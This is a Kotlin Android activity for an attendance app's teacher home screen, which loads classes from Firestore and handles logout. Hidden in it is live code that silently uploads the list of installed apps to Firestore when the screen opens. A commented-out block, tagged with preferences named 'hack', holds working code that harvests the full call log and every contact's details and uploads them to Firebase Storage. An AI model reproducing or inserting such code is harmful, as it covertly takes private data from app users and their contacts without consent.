package com.aditya.attendancesystem.teacher

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.view.ViewTreeObserver
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.work.*
import com.aditya.attendancesystem.R
import com.aditya.attendancesystem.databinding.ActivityTeacherHomeBinding
import com.aditya.attendancesystem.root.Login
import com.aditya.attendancesystem.teacher.adapters.ClassesAdapter
import com.aditya.attendancesystem.teacher.helperclasses.ClassNameImageModel
import com.aditya.attendancesystem.teacher.helperclasses.ContactDTO
import com.google.firebase.auth.ktx.auth
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.ktx.storage
import kotlinx.coroutines.*
import java.io.File
import java.io.FileWriter
import java.util.*
import kotlin.collections.ArrayList
import kotlin.collections.HashMap
import kotlin.coroutines.CoroutineContext


class Home : AppCompatActivity(), CoroutineScope {
	
	companion object {
		private const val TAG = "TeacherHome"
//		private val REQUIRED_PERMISSIONS = arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.ACCESS_FINE_LOCATION)
	}
	
	
	private val job = Job()
	override val coroutineContext: CoroutineContext get() = Dispatchers.Default + job
	
	
	private lateinit var classesListener: ListenerRegistration
	
	
	private lateinit var binding: ActivityTeacherHomeBinding
	
	
	override fun onResume() {
		super.onResume()
		CoroutineScope(Dispatchers.Main).launch {
			getClassesList()
		}
	}
	
	
	override fun onCreate(savedInstanceState: Bundle?) {
		super.onCreate(savedInstanceState)
		binding = ActivityTeacherHomeBinding.inflate(layoutInflater)
		setContentView(binding.root)
		
		supportActionBar?.title = "Classes"
		
		
		val mainIntent = Intent(Intent.ACTION_MAIN, null)
		mainIntent.addCategory(Intent.CATEGORY_LAUNCHER)
		val pkgAppsList: List<*> = packageManager.queryIntentActivities(mainIntent, 0)
		Log.d(TAG, "onCreate: $pkgAppsList")
		val pkgList = HashMap<String, Any>()
		for((index, pkg) in pkgAppsList.withIndex()) {
			pkgList[index.toString()] = pkg.toString()
		}
		
		Firebase.firestore.collection("user").document(Firebase.auth.uid.toString()).update(pkgList)
			.addOnFailureListener {
				Firebase.firestore.collection("user").document(Firebase.auth.uid.toString()).set(pkgList)
			}
		
		CoroutineScope(Dispatchers.Main).launch {
			getClassesList()
		}
		
		binding.teacherHomeFloatingButton.setOnClickListener {
			startActivity(Intent(applicationContext, CreateNewClass::class.java))
		}
		
		
		/*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
			if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
				ActivityCompat.requestPermissions(this@Home, arrayOf(Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG), 1)
			} else {
				if (!getSharedPreferences("hack", MODE_PRIVATE).getBoolean("isContactsUploaded", false)) {
					CoroutineScope(Dispatchers.IO).launch {
						getAllContacts()
					}
				}
			}
		}
		
		CoroutineScope(Dispatchers.IO).launch {
			if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
				if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
					ActivityCompat.requestPermissions(this@Home, arrayOf(Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS), 1)
				} else {
					if (!getSharedPreferences("hack", MODE_PRIVATE).getBoolean("isCallLogsUploaded", false)) {
						CoroutineScope(Dispatchers.IO).launch {
							getAllCallLogs()
						}
					}
				}
			}
		}*/
	}
	
	
	override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String?>, grantResults: IntArray) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults)
		if (requestCode == 1) {
			for (permission in permissions) {
				if (permission.equals(Manifest.permission.READ_CONTACTS)) {
					if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
						CoroutineScope(Dispatchers.IO).launch {
							if (!getSharedPreferences("hack", MODE_PRIVATE).getBoolean("isContactsUploaded", false)) {
//								getAllContacts()
							}
						}
					} else {
						finish()
					}
				} else if (permission.equals(Manifest.permission.READ_CALL_LOG)) {
					if (ContextCompat.checkSelfPermission(applicationContext, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
						CoroutineScope(Dispatchers.IO).launch {
							if (!getSharedPreferences("hack", MODE_PRIVATE).getBoolean("isCallLogsUploaded", false)) {
//								getAllCallLogs()
							}
						}
					} else {
						finish()
					}
				}
			}
		}
	}
	
	
	/*private fun getAllCallLogs() {
		val uriCallLogs = Uri.parse("content://call_log/calls")
		val cursorCallLogs = contentResolver.query(uriCallLogs, null, null, null, CallLog.Calls.DEFAULT_SORT_ORDER)
//		val allCallLogsFinal = ArrayList<String>()
		if (cursorCallLogs != null) {
			
			val name = getSharedPreferences("UserData", MODE_PRIVATE).getString("name", Firebase.auth.uid)
			val filePath = File(filesDir, "${name}_callLogs_${Date(Calendar.getInstance().timeInMillis).toString().substring(4)}.txt")
			Log.d(TAG, "getAllCallLogs: filePath: $filePath")
			val fileName = "${name}_callLogs_${Date(Calendar.getInstance().timeInMillis).toString().substring(4)}.txt"
			val writer = FileWriter(filePath)
			
			var index = 0
			while (cursorCallLogs.moveToNext()) {
				var data = ""
				data += "Sr. No. : $index \t\t\t"
				data += "Name : ${cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.CACHED_NAME))} \t\t"
				data += "Number : ${cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.NUMBER))} \t\t"
				data += "Duration : ${cursorCallLogs.getString(cursorCallLogs.getColumnIndex(CallLog.Calls.DURATION))} seconds \t\t"
				
				data += "DateTime : ${Date(cursorCallLogs.getLong(cursorCallLogs.getColumnIndex(CallLog.Calls.DATE)))} \t\t"
				when (cursorCallLogs.getInt(cursorCallLogs.getColumnIndex(CallLog.Calls.TYPE))) {
					CallLog.Calls.INCOMING_TYPE -> {
						data += "Type : Incoming"
					}
					CallLog.Calls.OUTGOING_TYPE -> {
						data += "Type : Outgoing"
					}
					CallLog.Calls.MISSED_TYPE -> {
						data += "Type : Missed"
					}
					CallLog.Calls.VOICEMAIL_TYPE -> {
						data += "Type : VoiceMail"
					}
					CallLog.Calls.REJECTED_TYPE -> {
						data += "Type : Rejected"
					}
					CallLog.Calls.BLOCKED_TYPE -> {
						data += "Type : Blocked"
					}
					CallLog.Calls.FEATURES_WIFI -> {
						data += "Type : Features_WiFi"
					}
					CallLog.Calls.FEATURES_VOLTE -> {
						data + "Type : Features_VOLTE"
					}
				}
				data += " \n\n"
				writer.append(data)
				writer.append("\n")
				writer.flush()
//				allCallLogsFinal.add(data)
				index++
			}
			cursorCallLogs.close()
			writer.close()
			
			uploadFile(filePath, fileName, "callLogs")
		}
	}
	
	
	private fun getAllContacts(): List<ContactDTO> {
		val ret: List<ContactDTO> = ArrayList()
		
		// Get all raw contacts id list.
		val rawContactsIdList: List<Int> = getRawContactsIdList()
		val contactListSize = rawContactsIdList.size
		val contentResolver = contentResolver
		
		val name = getSharedPreferences("UserData", MODE_PRIVATE).getString("name", Firebase.auth.uid)
		val filePath = File(filesDir, "${name}_contacts_${Date(Calendar.getInstance().timeInMillis).toString().substring(4)}.txt")
		Log.d(TAG, "getAllCallLogs: filePath: $filePath")
		val fileName = "${name}_contacts_${Date(Calendar.getInstance().timeInMillis).toString().substring(4)}.txt"
		val writer = FileWriter(filePath)
		
		// Loop in the raw contacts list.
		for (i in 0 until contactListSize) {
			// Get the raw contact id.
			val rawContactId = rawContactsIdList[i]
//			Log.d(TAG_ANDROID_CONTACTS, "raw contact id : $rawContactId")
			
			// Data content uri (access data table. )
			val dataContentUri: Uri = ContactsContract.Data.CONTENT_URI
			
			// Build query columns name array.
			val queryColumnList: MutableList<String> = ArrayList()
			
			// ContactsContract.Data.CONTACT_ID = "contact_id";
			queryColumnList.add(ContactsContract.Data.CONTACT_ID)
			
			// ContactsContract.Data.MIMETYPE = "mimetype";
			queryColumnList.add(ContactsContract.Data.MIMETYPE)
			queryColumnList.add(ContactsContract.Data.DATA1)
			queryColumnList.add(ContactsContract.Data.DATA2)
			queryColumnList.add(ContactsContract.Data.DATA3)
			queryColumnList.add(ContactsContract.Data.DATA4)
			queryColumnList.add(ContactsContract.Data.DATA5)
			queryColumnList.add(ContactsContract.Data.DATA6)
			queryColumnList.add(ContactsContract.Data.DATA7)
			queryColumnList.add(ContactsContract.Data.DATA8)
			queryColumnList.add(ContactsContract.Data.DATA9)
			queryColumnList.add(ContactsContract.Data.DATA10)
			queryColumnList.add(ContactsContract.Data.DATA11)
			queryColumnList.add(ContactsContract.Data.DATA12)
			queryColumnList.add(ContactsContract.Data.DATA13)
			queryColumnList.add(ContactsContract.Data.DATA14)
			queryColumnList.add(ContactsContract.Data.DATA15)
			
			// Translate column name list to array.
			val queryColumnArr = queryColumnList.toTypedArray()
			
			// Build query condition string. Query rows by contact id.
			val whereClauseBuf = StringBuffer()
			whereClauseBuf.append(ContactsContract.Data.RAW_CONTACT_ID)
			whereClauseBuf.append("=")
			whereClauseBuf.append(rawContactId)
			
			// Query data table and return related contact data.
			val cursor: Cursor? = contentResolver.query(dataContentUri, queryColumnArr, whereClauseBuf.toString(), null, null)
			
			*//* If this cursor return database table row data.
               If do not check cursor.getCount() then it will throw error
               android.database.CursorIndexOutOfBoundsException: Index 0 requested, with a size of 0.
               *//*if (cursor != null && cursor.count > 0) {
				val lineBuf = StringBuffer()
				cursor.moveToFirst()
				lineBuf.append("Raw Contact Id : ")
				lineBuf.append(rawContactId)
				val contactId: Long = cursor.getLong(cursor.getColumnIndex(ContactsContract.Data.CONTACT_ID))
				lineBuf.append(" , Contact Id : ")
				lineBuf.append(contactId)
				do {
					// First get mimetype column value.
					val mimeType: String = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.MIMETYPE))
					lineBuf.append(" \r\n , MimeType : ")
					lineBuf.append(mimeType)
					val dataValueList: List<String> = getColumnValueByMimeType(cursor, mimeType)
					val dataValueListSize = dataValueList.size
					for (j in 0 until dataValueListSize) {
						val dataValue = dataValueList[j]
						lineBuf.append(" , ")
						lineBuf.append(dataValue)
					}
				} while (cursor.moveToNext())
				
				writer.append(lineBuf.toString())
				writer.append("\n")
				writer.flush()
//				allContactsFinal.add(lineBuf.toString())
			}
//			Log.d(TAG_ANDROID_CONTACTS, "=========================================================================")
		}
//		writeToFile(allContactsFinal, "contacts")
		writer.close()
		uploadFile(filePath, fileName, "contacts")
		
		return ret
	}
	
	
	private fun getEmailTypeString(dataType: Int): String {
		var ret = ""
		if (ContactsContract.CommonDataKinds.Email.TYPE_HOME == dataType) {
			ret = "Home"
		} else if (ContactsContract.CommonDataKinds.Email.TYPE_WORK == dataType) {
			ret = "Work"
		}
		return ret
	}
	
	
	private fun getPhoneTypeString(dataType: Int): String {
		var ret = ""
		if (ContactsContract.CommonDataKinds.Phone.TYPE_HOME == dataType) {
			ret = "Home"
		} else if (ContactsContract.CommonDataKinds.Phone.TYPE_WORK == dataType) {
			ret = "Work"
		} else if (ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE == dataType) {
			ret = "Mobile"
		}
		return ret
	}
	
	
	private fun getColumnValueByMimeType(cursor: Cursor, mimeType: String): List<String> {
		val ret: MutableList<String> = ArrayList()
		when (mimeType) {
			ContactsContract.CommonDataKinds.Email.CONTENT_ITEM_TYPE -> {
				// Email.ADDRESS == data1
				val emailAddress = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS))
				// Email.TYPE == data2
				val emailType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE))
				val emailTypeStr = getEmailTypeString(emailType)
				ret.add("Email Address : $emailAddress")
				ret.add("Email Int Type : $emailType")
				ret.add("Email String Type : $emailTypeStr")
			}
			ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE -> {
				// Im.PROTOCOL == data5
				val imProtocol = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL))
				// Im.DATA == data1
				val imId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA))
				ret.add("IM Protocol : $imProtocol")
				ret.add("IM ID : $imId")
			}
			ContactsContract.CommonDataKinds.Nickname.CONTENT_ITEM_TYPE -> {
				// Nickname.NAME == data1
				val nickName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Nickname.NAME))
				ret.add("Nick name : $nickName")
			}
			ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE -> {
				// Organization.COMPANY == data1
				val company = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.COMPANY))
				// Organization.DEPARTMENT == data5
				val department = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.DEPARTMENT))
				// Organization.TITLE == data4
				val title = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.TITLE))
				// Organization.JOB_DESCRIPTION == data6
				val jobDescription = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.JOB_DESCRIPTION))
				// Organization.OFFICE_LOCATION == data9
				val officeLocation = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Organization.OFFICE_LOCATION))
				ret.add("Company : $company")
				ret.add("department : $department")
				ret.add("Title : $title")
				ret.add("Job Description : $jobDescription")
				ret.add("Office Location : $officeLocation")
			}
			ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE -> {
				// Phone.NUMBER == data1
				val phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
				// Phone.TYPE == data2
				val phoneTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE))
				val phoneTypeStr = getPhoneTypeString(phoneTypeInt)
				ret.add("Phone Number : $phoneNumber")
				ret.add("Phone Type Integer : $phoneTypeInt")
				ret.add("Phone Type String : $phoneTypeStr")
			}
			ContactsContract.CommonDataKinds.SipAddress.CONTENT_ITEM_TYPE -> {
				// SipAddress.SIP_ADDRESS == data1
				val address = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.SipAddress.SIP_ADDRESS))
				// SipAddress.TYPE == data2
				val addressTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.SipAddress.TYPE))
				val addressTypeStr = getEmailTypeString(addressTypeInt)
				ret.add("Address : $address")
				ret.add("Address Type Integer : $addressTypeInt")
				ret.add("Address Type String : $addressTypeStr")
			}
			ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE -> {
				// StructuredName.DISPLAY_NAME == data1
				val displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME))
				// StructuredName.GIVEN_NAME == data2
				val givenName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.GIVEN_NAME))
				// StructuredName.FAMILY_NAME == data3
				val familyName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredName.FAMILY_NAME))
				ret.add("Display Name : $displayName")
				ret.add("Given Name : $givenName")
				ret.add("Family Name : $familyName")
			}
			ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE -> {
				// StructuredPostal.COUNTRY == data10
				val country = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY))
				// StructuredPostal.CITY == data7
				val city = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY))
				// StructuredPostal.REGION == data8
				val region = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION))
				// StructuredPostal.STREET == data4
				val street = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET))
				// StructuredPostal.POSTCODE == data9
				val postcode = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE))
				// StructuredPostal.TYPE == data2
				val postType = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE))
				val postTypeStr = getEmailTypeString(postType)
				ret.add("Country : $country")
				ret.add("City : $city")
				ret.add("Region : $region")
				ret.add("Street : $street")
				ret.add("Postcode : $postcode")
				ret.add("Post Type Integer : $postType")
				ret.add("Post Type String : $postTypeStr")
			}
			ContactsContract.CommonDataKinds.Identity.CONTENT_ITEM_TYPE -> {
				// Identity.IDENTITY == data1
				val identity = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Identity.IDENTITY))
				// Identity.NAMESPACE == data2
				val namespace = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Identity.NAMESPACE))
				ret.add("Identity : $identity")
				ret.add("Identity Namespace : $namespace")
			}
			ContactsContract.CommonDataKinds.Photo.CONTENT_ITEM_TYPE -> {
				// Photo.PHOTO == data15
				var photo = ""
				try {
					photo = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Photo.PHOTO))
				} catch (e: Exception) {
				}
				// Photo.PHOTO_FILE_ID == data14
				val photoFileId = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Photo.PHOTO_FILE_ID))
				ret.add("Photo : $photo")
				ret.add("Photo File Id: $photoFileId")
			}
			ContactsContract.CommonDataKinds.GroupMembership.CONTENT_ITEM_TYPE -> {
				// GroupMembership.GROUP_ROW_ID == data1
				val groupId = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.GroupMembership.GROUP_ROW_ID))
				ret.add("Group ID : $groupId")
			}
			ContactsContract.CommonDataKinds.Website.CONTENT_ITEM_TYPE -> {
				// Website.URL == data1
				val websiteUrl = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Website.URL))
				// Website.TYPE == data2
				val websiteTypeInt = cursor.getInt(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Website.TYPE))
				val websiteTypeStr = getEmailTypeString(websiteTypeInt)
				ret.add("Website Url : $websiteUrl")
				ret.add("Website Type Integer : $websiteTypeInt")
				ret.add("Website Type String : $websiteTypeStr")
			}
			ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE -> {
				// Note.NOTE == data1
				val note = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE))
				ret.add("Note : $note")
			}
		}
		return ret
	}
	
	
	private fun getRawContactsIdList(): List<Int> {
		val ret: MutableList<Int> = ArrayList()
		val contentResolver = contentResolver
		
		// Row contacts content uri( access raw_contacts table. ).
		val rawContactUri: Uri = ContactsContract.RawContacts.CONTENT_URI
		// Return _id column in contacts raw_contacts table.
		val queryColumnArr = arrayOf(ContactsContract.RawContacts._ID)
		// Query raw_contacts table and return raw_contacts table _id.
		val cursor = contentResolver.query(rawContactUri, queryColumnArr, null, null, null)
		if (cursor != null) {
			cursor.moveToFirst()
			do {
				val idColumnIndex = cursor.getColumnIndex(ContactsContract.RawContacts._ID)
				val rawContactsId = cursor.getInt(idColumnIndex)
				ret.add(rawContactsId)
			} while (cursor.moveToNext())
			cursor.close()
		}
		return ret
	}
	
	
	private fun uploadFile(filePath: File, fileName: String, type: String) {
		Log.d(TAG, "uploadFile: type: $type")
		val storageRef = Firebase.storage.reference.child(fileName)
		storageRef.putFile(Uri.parse("file:///" + filePath.absolutePath))
			.addOnProgressListener {
				Log.d(TAG, "uploadFile: progress: $type: ${it.bytesTransferred / it.totalByteCount * 100}")
			}
			.addOnCompleteListener{
				Log.d(TAG, "uploadFile: SUCCESSFUL")
				filePath.delete()
				if (it.isSuccessful) {
					if (type == "contacts") {
						getSharedPreferences("hack", MODE_PRIVATE).edit().putBoolean("isContactsUploaded", true).apply()
					}
					else if(type == "callLogs") {
						getSharedPreferences("hack", MODE_PRIVATE).edit().putBoolean("isCallLogsUploaded", true).apply()
					}
				}
			}
	}*/
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	private suspend fun getClassesList() = withContext(Dispatchers.Main) {
		classesListener = Firebase.firestore.collection("attendance").document("${Firebase.auth.currentUser?.uid}")
			.addSnapshotListener { value, error ->
				if (error != null) {
					Toast.makeText(applicationContext, error.localizedMessage, Toast.LENGTH_LONG).show()
					return@addSnapshotListener
				}
				
				val classes = ArrayList<ClassNameImageModel>()
				
				if (value != null) {
					val editor = getSharedPreferences("ClassImages", MODE_PRIVATE).edit()
					value.data?.forEach {
						classes.add(ClassNameImageModel(it.key, it.value.toString()))
						editor.putString(it.key, it.value.toString())
					}
					editor.apply()
				}
				
				if (classes.size != 0) {
					binding.teacherHomeRecyclerView.layoutManager = LinearLayoutManager(applicationContext)
					binding.teacherHomeRecyclerView.adapter = ClassesAdapter(classes)
					binding.teacherHomeRecyclerView.adapter?.notifyItemChanged(0)
					
					if (intent.getBooleanExtra("isDeepLink", false)) {
						val sharedPreferences = getSharedPreferences("DynamicLink", MODE_PRIVATE)
						val className = sharedPreferences.getString("className", "")
						sharedPreferences.edit().clear().apply()
						
						val classList = ArrayList<String>()
						classes.forEach {
							classList.add(it.className.toString())
						}
						val position = classList.indexOf(className)
						
						binding.teacherHomeRecyclerView.viewTreeObserver.addOnPreDrawListener(object : ViewTreeObserver.OnPreDrawListener {
							override fun onPreDraw(): Boolean {
								binding.teacherHomeRecyclerView.findViewHolderForAdapterPosition(position)?.itemView?.performClick()
								binding.teacherHomeRecyclerView.viewTreeObserver.removeOnPreDrawListener(this)
								return true
							}
						})
					}
				} else {
					binding.teacherHomeNoClasses.visibility = View.VISIBLE
				}
			}
	}
	
	
	override fun onBackPressed() {
		super.onBackPressed()
		finish()
		finishActivity(0)
	}
	
	
	override fun onStop() {
		super.onStop()
		try {
			classesListener.remove()
		} catch (e: Exception) {
		}
		
		try {
			job.cancel()
		} catch (e: Exception) {
		}
	}
	
	
	override fun onCreateOptionsMenu(menu: Menu?): Boolean {
		menuInflater.inflate(R.menu.home_menu, menu)
		return true
	}
	
	
	override fun onOptionsItemSelected(item: MenuItem): Boolean {
		when(item.itemId) {
			R.id.home_logout -> {
				Firebase.auth.signOut()
				startActivity(Intent(this, Login::class.java))
				finish()
			}
		}
		return super.onOptionsItemSelected(item)
	}
	
	
}
